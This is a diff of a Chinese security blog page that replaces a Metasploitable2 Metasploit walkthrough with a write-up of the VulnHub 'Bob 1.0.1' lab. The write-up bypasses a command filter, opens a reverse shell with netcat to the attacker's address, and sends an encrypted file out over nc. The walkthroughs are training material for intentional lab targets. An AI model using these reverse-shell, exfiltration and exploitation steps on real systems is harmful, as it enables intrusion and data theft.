@@ -79,38 +79,44 @@
 
 
 
-<meta name="description" content="0x00 环境准备最近看了metasploit一直想搭建个靶机自己试一试，没时间，终于今天抽空搞了搞。[*]攻击机：Kali Linux。[*]目标机：Metasploitable2这两台虚拟机都在VMvare下搭建。要注意的是Metasploitable2的初始用户名和密码都是msfadmin。 0x01 开始测试我们需要两台机子处于同一网段下首先查看攻击机ip。然后查看目标集ip。我们发现两台">
+<meta name="description" content="题记最近在打靶机，发现了一个挺有意思又挺有技巧性的靶机，这里想跟大家分享一下，各位大佬轻喷。 环境准备https://download.vulnhub.com/bob/Bob_v1.0.1.ova (靶机下载地址)攻击机 Kali IP 192.168.107.129靶机在同一C段下 主机发现使用命令nmap -sP 192.168.107.1/24。192.168.107.1是我物理机的ip，而">
 <meta property="og:type" content="article">
-<meta property="og:title" content="记一次kali渗透测试靶机">
-<meta property="og:url" content="http://yoursite.com/2018/05/03/渗透测试/index.html">
+<meta property="og:title" content="Bob 1.0.1">
+<meta property="og:url" content="http://yoursite.com/2018/06/29/The game of bob/index.html">
 <meta property="og:site_name" content="Hu3sky">
-<meta property="og:description" content="0x00 环境准备最近看了metasploit一直想搭建个靶机自己试一试，没时间，终于今天抽空搞了搞。[*]攻击机：Kali Linux。[*]目标机：Metasploitable2这两台虚拟机都在VMvare下搭建。要注意的是Metasploitable2的初始用户名和密码都是msfadmin。 0x01 开始测试我们需要两台机子处于同一网段下首先查看攻击机ip。然后查看目标集ip。我们发现两台">
+<meta property="og:description" content="题记最近在打靶机，发现了一个挺有意思又挺有技巧性的靶机，这里想跟大家分享一下，各位大佬轻喷。 环境准备https://download.vulnhub.com/bob/Bob_v1.0.1.ova (靶机下载地址)攻击机 Kali IP 192.168.107.129靶机在同一C段下 主机发现使用命令nmap -sP 192.168.107.1/24。192.168.107.1是我物理机的ip，而">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:image" content="http://yoursite.com/kali/1.png">
-<meta property="og:image" content="http://yoursite.com/kali/2.png">
-<meta property="og:image" content="http://yoursite.com/kali/nmap.png">
-<meta property="og:image" content="http://yoursite.com/kali/nmap2.png">
-<meta property="og:image" content="http://yoursite.com/kali/3.png">
-<meta property="og:image" content="http://yoursite.com/kali/4.png">
-<meta property="og:image" content="http://yoursite.com/kali/5.png">
-<meta property="og:image" content="http://yoursite.com/kali/6.png">
-<meta property="og:image" content="http://yoursite.com/kali/7.png">
-<meta property="og:image" content="http://yoursite.com/kali/8.png">
-<meta property="og:image" content="http://yoursite.com/kali/9.png">
-<meta property="og:image" content="http://yoursite.com/2018/05/03/渗透测试/kali/10.png">
-<meta property="og:image" content="http://yoursite.com/kali/11.png">
-<meta property="og:image" content="http://yoursite.com/kali/12.png">
-<meta property="og:image" content="http://yoursite.com/kali/14.png">
-<meta property="og:image" content="http://yoursite.com/kali/15.png">
-<meta property="og:image" content="http://yoursite.com/kali/13.png">
-<meta property="og:image" content="http://yoursite.com/kali/16.png">
-<meta property="og:image" content="http://yoursite.com/kali/17.png">
-<meta property="og:image" content="http://yoursite.com/kali/18.png">
-<meta property="og:updated_time" content="2018-05-03T07:47:28.953Z">
+<meta property="og:image" content="http://yoursite.com/bob/1.png">
+<meta property="og:image" content="http://yoursite.com/bob/9.png">
+<meta property="og:image" content="http://yoursite.com/bob/2.png">
+<meta property="og:image" content="http://yoursite.com/bob/3.png">
+<meta property="og:image" content="http://yoursite.com/bob/27.png">
+<meta property="og:image" content="http://yoursite.com/bob/28.png">
+<meta property="og:image" content="http://yoursite.com/bob/4.png">
+<meta property="og:image" content="http://yoursite.com/bob/5.png">
+<meta property="og:image" content="http://yoursite.com/bob/7.png">
+<meta property="og:image" content="http://yoursite.com/bob/8.png">
+<meta property="og:image" content="http://yoursite.com/bob/10.png">
+<meta property="og:image" content="http://yoursite.com/bob/11.png">
+<meta property="og:image" content="http://yoursite.com/bob/12.png">
+<meta property="og:image" content="http://yoursite.com/bob/13.png">
+<meta property="og:image" content="http://yoursite.com/bob/14.png">
+<meta property="og:image" content="http://yoursite.com/bob/17.png">
+<meta property="og:image" content="http://yoursite.com/bob/29.png">
+<meta property="og:image" content="http://yoursite.com/bob/19.png">
+<meta property="og:image" content="http://yoursite.com/bob/30.png">
+<meta property="og:image" content="http://yoursite.com/bob/31.png">
+<meta property="og:image" content="http://yoursite.com/bob/18.png">
+<meta property="og:image" content="http://yoursite.com/bob/23.png">
+<meta property="og:image" content="http://yoursite.com/bob/20.png">
+<meta property="og:image" content="http://yoursite.com/bob/21.png">
+<meta property="og:image" content="http://yoursite.com/bob/24.png">
+<meta property="og:image" content="http://yoursite.com/bob/25.png">
+<meta property="og:updated_time" content="2018-06-29T15:19:45.133Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="记一次kali渗透测试靶机">
-<meta name="twitter:description" content="0x00 环境准备最近看了metasploit一直想搭建个靶机自己试一试，没时间，终于今天抽空搞了搞。[*]攻击机：Kali Linux。[*]目标机：Metasploitable2这两台虚拟机都在VMvare下搭建。要注意的是Metasploitable2的初始用户名和密码都是msfadmin。 0x01 开始测试我们需要两台机子处于同一网段下首先查看攻击机ip。然后查看目标集ip。我们发现两台">
-<meta name="twitter:image" content="http://yoursite.com/kali/1.png">
+<meta name="twitter:title" content="Bob 1.0.1">
+<meta name="twitter:description" content="题记最近在打靶机，发现了一个挺有意思又挺有技巧性的靶机，这里想跟大家分享一下，各位大佬轻喷。 环境准备https://download.vulnhub.com/bob/Bob_v1.0.1.ova (靶机下载地址)攻击机 Kali IP 192.168.107.129靶机在同一C段下 主机发现使用命令nmap -sP 192.168.107.1/24。192.168.107.1是我物理机的ip，而">
+<meta name="twitter:image" content="http://yoursite.com/bob/1.png">
 
 
 
@@ -140,13 +146,13 @@
 
 
 
-  <link rel="canonical" href="http://yoursite.com/2018/05/03/渗透测试/"/>
+  <link rel="canonical" href="http://yoursite.com/2018/06/29/The game of bob/"/>
 
 
 
 
 
-  <title>记一次kali渗透测试靶机 | Hu3sky</title>
+  <title>Bob 1.0.1 | Hu3sky</title>
   
 
 
@@ -284,7 +290,7 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/05/03/渗透测试/">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2018/06/29/The game of bob/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Hu3sky">
@@ -301,7 +307,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">记一次kali渗透测试靶机</h1>
+          <h1 class="post-title" itemprop="name headline">Bob 1.0.1</h1>
         
 
         <div class="post-meta">
@@ -313,8 +319,8 @@
               
                 <span class="post-meta-item-text">发表于</span>
               
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-05-03T14:36:39+08:00">
-                2018-05-03
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-06-29T23:19:29+08:00">
+                2018-06-29
               </time>
             
 
@@ -373,19 +379,19 @@
       
 
       
-        <h1 id="0x00-环境准备"><a href="#0x00-环境准备" class="headerlink" title="0x00 环境准备"></a>0x00 环境准备</h1><p>最近看了metasploit一直想搭建个靶机自己试一试，没时间，终于今天抽空搞了搞。<br>[*]攻击机：Kali Linux。<br>[*]目标机：Metasploitable2<br>这两台虚拟机都在VMvare下搭建。要注意的是Metasploitable2的初始用户名和密码都是msfadmin。</p>
-<h1 id="0x01-开始测试"><a href="#0x01-开始测试" class="headerlink" title="0x01 开始测试"></a>0x01 开始测试</h1><p>我们需要两台机子处于同一网段下<br>首先查看攻击机ip。<img src="/kali/1.png" alt="1"><br>然后查看目标集ip。<img src="/kali/2.png" alt="2"><br>我们发现两台机子确实存在与同一网段下。</p>
-<h1 id="0x02-端口扫描"><a href="#0x02-端口扫描" class="headerlink" title="0x02 端口扫描"></a>0x02 端口扫描</h1><p>第一步我们需要在kali上检测我们的目标机开放了哪些端口，使用命令<code>nmap -sS 192.168.91.129</code><br><img src="/kali/nmap.png" alt="nmap"><br><img src="/kali/nmap2.png" alt="nmap2"></p>
-<h1 id="0x03-DO-IT"><a href="#0x03-DO-IT" class="headerlink" title="0x03 DO IT"></a>0x03 DO IT</h1><h2 id="6667-irc-3281-backdoor"><a href="#6667-irc-3281-backdoor" class="headerlink" title="6667-irc_3281_backdoor"></a>6667-irc_3281_backdoor</h2><p>这里我们打开msf，命令<code>msfconsole</code><br>使用这个模块 <img src="/kali/3.png" alt="3">。并且查看options<img src="/kali/4.png" alt="4"><br>我们发现Requried都是yes。说明都需要我们设置。但这里RPORT不用设置，就是6667端口，我们用<code>set RHOST 192.168.91.129</code>将目标机的ip设置好.然后设置本机ip<code>set LHOST 192.168.91.128</code>。然后<code>exploit</code>执行命令<img src="/kali/5.png" alt="5"><br>可以发现，我们已经成功取得会话，并且是root权限</p>
-<h2 id="6200-vsftpd-234-backdoor"><a href="#6200-vsftpd-234-backdoor" class="headerlink" title="6200-vsftpd_234_backdoor"></a>6200-vsftpd_234_backdoor</h2><p>利用这一个漏洞模块<br><img src="/kali/6.png" alt="6"><br>我们利用的是tcp 21端口。设置好rhost之后，执行命令<br><img src="/kali/7.png" alt="7"><br>再一次反弹了shell，root权限</p>
-<h2 id="139-samba为3-0漏洞"><a href="#139-samba为3-0漏洞" class="headerlink" title="139-samba为3.0漏洞"></a>139-samba为3.0漏洞</h2><p>我们先使用命令<code>nmap -v -A -T4 192.168.8.135</code>得到详细信息<br><img src="/kali/8.png" alt="8"><br>可以看到samba版本为3.0.20<br>接下来。利用metasploit<br><code>search samba</code>命令<br>使用这一个模块<img src="/kali/9.png" alt="+"><br>设置ip。<img src="kali/10.png" alt="10">.接着exploit<br><img src="/kali/11.png" alt="11"></p>
-<h2 id="8180——-Apache-Tomcat弱口令"><a href="#8180——-Apache-Tomcat弱口令" class="headerlink" title="8180——-Apache Tomcat弱口令"></a>8180——-Apache Tomcat弱口令</h2><p><img src="/kali/12.png" alt="12"><br>依旧使用这个模块<br>使用use auxiliary/scanner/http/tomcat_mgr_login进行账户爆破<br>用默认自带的自带就行了<br>爆破操作如下<br><img src="/kali/14.png" alt="14"><br><img src="/kali/15.png" alt="15"><br><img src="/kali/13.png" alt="13"></p>
-<p>[*]set THREADS 10           –&gt;设置线程数</p>
-<p>需要注意的是，这里设置不是RHOST,而是RHOSTS。<br>最后得到用户名/密码 tomcat/tomcat</p>
-<p>然后 <code>use exploit/multi/http/tomcat_mgr_upload</code><br>修改设置<br><img src="/kali/16.png" alt="16"><br>将rport设置为8180<br><img src="/kali/17.png" alt="17"><br>可以看到获取了meterpreter会话<br>用shell命令进入shell<br><img src="/kali/18.png" alt="18"></p>
-<h1 id="0x04"><a href="#0x04" class="headerlink" title="0x04"></a>0x04</h1><ul>
-<li>最后附上学习链接 <a href="https://blog.csdn.net/wyvbboy/article/details/53183054" target="_blank" rel="noopener">https://blog.csdn.net/wyvbboy/article/details/53183054</a></li>
-</ul>
+        <h1 id="题记"><a href="#题记" class="headerlink" title="题记"></a>题记</h1><p>最近在打靶机，发现了一个挺有意思又挺有技巧性的靶机，这里想跟大家分享一下，各位大佬轻喷。</p>
+<h1 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h1><p><a href="https://download.vulnhub.com/bob/Bob_v1.0.1.ova" target="_blank" rel="noopener">https://download.vulnhub.com/bob/Bob_v1.0.1.ova</a> (靶机下载地址)<br>攻击机 Kali IP 192.168.107.129<br>靶机在同一C段下</p>
+<h1 id="主机发现"><a href="#主机发现" class="headerlink" title="主机发现"></a>主机发现</h1><p>使用命令<code>nmap -sP 192.168.107.1/24</code><br><img src="/bob/1.png" alt="1">。<br>192.168.107.1是我物理机的ip，而192.168.107.254是结束ip。所以说我们的靶机ip就是192.168.107.132.</p>
+<h1 id="端口扫描"><a href="#端口扫描" class="headerlink" title="端口扫描"></a>端口扫描</h1><p>使用命令<code>nmap -sS 192.168.107.132</code><br><img src="/bob/9.png" alt="2">。我们发现只开放了一个web 80端口。我们访问。<br><img src="/bob/2.png" alt="3">。上面虽说有Home之类的选项。但是点不动的，没用。<br>所以说web页面上没什么搞头，所以我们从目录下手</p>
+<h1 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h1><p>这里我使用御剑扫描，可以看到，扫出来了robots.txt<img src="/bob/3.png" alt="4">。访问，看到如下几个根目录。依次访问一下。<br>login.php直接是404。passwords.html是<img src="/bob/27.png" alt="5">。lat_memo.html是<img src="/bob/28.png" alt="6">。这两个页面都没什么有用的信息。接下来是dev_shell.php。这才是本次靶机的突破口。<img src="/bob/4.png" alt="7">。</p>
+<h1 id="寻找突破口"><a href="#寻找突破口" class="headerlink" title="寻找突破口"></a>寻找突破口</h1><p>一开始，我天真的以为这是一个后面。。。。拿起burp就去爆破密码，半天爆不出来。再回头来看，发现有个Output。想一想会不会是一个执行命令的。试一试<img src="/bob/5.png" alt="8">果然。执行了命令，当我使用<code>ls</code>时，<img src="/bob/7.png" alt="9">页面没有了回显。于是，我推测，应该是ls被禁用了，但是不要忘了，ls还有个加强版的命令(也不能说是加强版，理解意思就行)。<code>lsattr</code>，我们试一试，<img src="/bob/8.png" alt="10">,没用过滤，这下可以看到很多有用的东西。比如说这个./dev_shell_php.bak，这很明显是个源码泄露，我们把源码DOWN下来。<img src="/bob/10.png" alt="11">。看到上面过滤了一些命令，其中包括我们可能用到的<code>ls，nc，cat</code>。 其实这样也可以一步一步进行信息的搜集<img src="/bob/11.png" alt="12">。但是，每次都要输这么多，显然是很麻烦的。所以我想反弹一个shell到我的攻击机上。但是nc都被禁了，这里用了很多方式，最后发现这种方式能够绕过，直接去/bin里使用命令，比如我使用cat使用命令<code>/bin/cat robots.txt</code><img src="/bob/12.png" alt="13">。</p>
+<h1 id="获取会话"><a href="#获取会话" class="headerlink" title="获取会话"></a>获取会话</h1><p>知道怎么绕过nc，接下来就是获得会话了，首先在我的攻击机上使用命令<code>nc -lvp 4444</code>，接着在执行命令界面使用 <code>/bin/nc -e /bin/sh 192.168.107.1 4444</code>。然后，成功获取会话。<img src="/bob/13.png" alt="14">。<code>whoami</code> 可以看到我们目前的权限。为了美化一下界面，产生一个TTY Shell 使用<code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code>。<img src="/bob/14.png" alt="15">,接着<code>ls</code>看下目录下的文件，有个flag.txt，应该是没权限查看的<img src="/bob/17.png" alt="16">。</p>
+<h1 id="获得密码"><a href="#获得密码" class="headerlink" title="获得密码"></a>获得密码</h1><p>进入home目录，查看一下有哪些用户。<img src="/bob/29.png" alt="17">。先看bob吧，<img src="/bob/19.png" alt="18">。可以看到两个文件和一个目录，那个login.txt.gpg是gpg加密的，需要密码，所以，现在的目标，就是要搞到密码。同目录下还有个Secret，跟进去看看。<img src="/bob/30.png" alt="19">。这个地方，需要有某种常识。。。这个地方也是卡了半天。。<img src="/bob/31.png" alt="20">，就是这个，可以发现就是个所谓的’藏头诗’<img src="/bob/18.png" alt="21">。这也是比较有意思的，不知道确实就真的不知道了。。所以，密码自然就是这个每一句的开头了。<br>然后我们使用命令解密<code>gpg --batch --passphrase HARPOCRATES -d login.txt.gpg</code>。结果还是没法<img src="/bob/23.png" alt="22">。这里又卡了半天，<br>我是这样做的👉：用nc将该文件转发到我的攻击机上，再用gpg解密。</p>
+<ol>
+<li>先在攻击机上<code>nc -lvp 1235 &gt; login.txt.gpg</code>。意思是接收的文件是login.txt.gpg</li>
+<li>在靶机上先切换到/home/bob/Documents下，接着使用命令<code>nc -w 3 192.168.107.129 1235 &lt; login.txt.gpg</code>。<br><img src="/bob/20.png" alt="23">。接着<code>ctrl c</code>结束,查看<img src="/bob/21.png" alt="24">。已经被转移过来了，然后，再次使用解密命令解密。<img src="/bob/24.png" alt="25">，解密成功。获得了bob的密码。</li>
+</ol>
+<h1 id="get-flag"><a href="#get-flag" class="headerlink" title="get flag"></a>get flag</h1><p>登陆bob的账号。<code>su bob</code>。然后我直接<code>sudo cat flag.txt</code>。就得到了flag<img src="/bob/25.png" alt="26"></p>
 
       
     </div>
@@ -410,8 +416,8 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2018/04/23/实验吧/" rel="next" title="实验吧WP">
-                <i class="fa fa-chevron-left"></i> 实验吧WP
+              <a href="/2018/06/29/xxe学习/" rel="next" title="浅谈XML实体注入漏洞">
+                <i class="fa fa-chevron-left"></i> 浅谈XML实体注入漏洞
               </a>
             
           </div>
@@ -419,10 +425,6 @@
           <span class="post-nav-divider"></span>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2018/05/09/php反序列化学习/" rel="prev" title="ctf一道题目。php反序列化学习">
-                ctf一道题目。php反序列化学习 <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -549,7 +551,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-环境准备"><span class="nav-number">1.</span> <span class="nav-text">0x00 环境准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-开始测试"><span class="nav-number">2.</span> <span class="nav-text">0x01 开始测试</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-端口扫描"><span class="nav-number">3.</span> <span class="nav-text">0x02 端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-DO-IT"><span class="nav-number">4.</span> <span class="nav-text">0x03 DO IT</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#6667-irc-3281-backdoor"><span class="nav-number">4.1.</span> <span class="nav-text">6667-irc_3281_backdoor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6200-vsftpd-234-backdoor"><span class="nav-number">4.2.</span> <span class="nav-text">6200-vsftpd_234_backdoor</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#139-samba为3-0漏洞"><span class="nav-number">4.3.</span> <span class="nav-text">139-samba为3.0漏洞</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#8180——-Apache-Tomcat弱口令"><span class="nav-number">4.4.</span> <span class="nav-text">8180——-Apache Tomcat弱口令</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x04"><span class="nav-number">5.</span> <span class="nav-text">0x04</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#题记"><span class="nav-number">1.</span> <span class="nav-text">题记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#环境准备"><span class="nav-number">2.</span> <span class="nav-text">环境准备</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#主机发现"><span class="nav-number">3.</span> <span class="nav-text">主机发现</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#端口扫描"><span class="nav-number">4.</span> <span class="nav-text">端口扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#目录扫描"><span class="nav-number">5.</span> <span class="nav-text">目录扫描</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#寻找突破口"><span class="nav-number">6.</span> <span class="nav-text">寻找突破口</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#获取会话"><span class="nav-number">7.</span> <span class="nav-text">获取会话</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#获得密码"><span class="nav-number">8.</span> <span class="nav-text">获得密码</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#get-flag"><span class="nav-number">9.</span> <span class="nav-text">get flag</span></a></li></ol></div>
             
 
           </div>
